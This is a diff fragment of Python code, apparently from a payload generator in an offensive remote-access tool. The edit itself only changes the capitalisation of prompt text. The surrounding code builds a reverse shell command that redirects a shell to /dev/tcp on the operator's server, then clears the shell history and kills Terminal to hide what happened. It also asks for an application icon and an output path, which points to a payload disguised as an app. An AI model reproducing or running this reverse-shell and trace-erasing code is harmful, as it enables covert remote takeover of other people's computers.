@@ -29,9 +29,9 @@ class payload:
 
 	def run(self,server):
 		while 1:
-			shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
+			shell = raw_input(h.info_general_raw("Target shell: ")).strip(" ")
 			while shell == "":
-			    shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
+			    shell = raw_input(h.info_general_raw("Target shell: ")).strip(" ")
                         icon = raw_input(h.info_general_raw("Application Icon: ")).strip(" ")
 			while icon == "":
 			    icon = raw_input(h.info_general_raw("Application Icon: ")).strip(" ")
@@ -43,9 +43,9 @@ class payload:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				break
 		shell_command += "history -wc;killall Terminal"
-		path = raw_input(h.info_general_raw("Output Path: ")).strip(" ")
+		path = raw_input(h.info_general_raw("Output path: ")).strip(" ")
 		while path == "":
-		    path = raw_input(h.info_general_raw("Output Path: ")).strip(" ")
+		    path = raw_input(h.info_general_raw("Output path: ")).strip(" ")
 		if os.path.isdir(path):
 		    if os.path.exists(path):
 			if path[-1:] == "/":
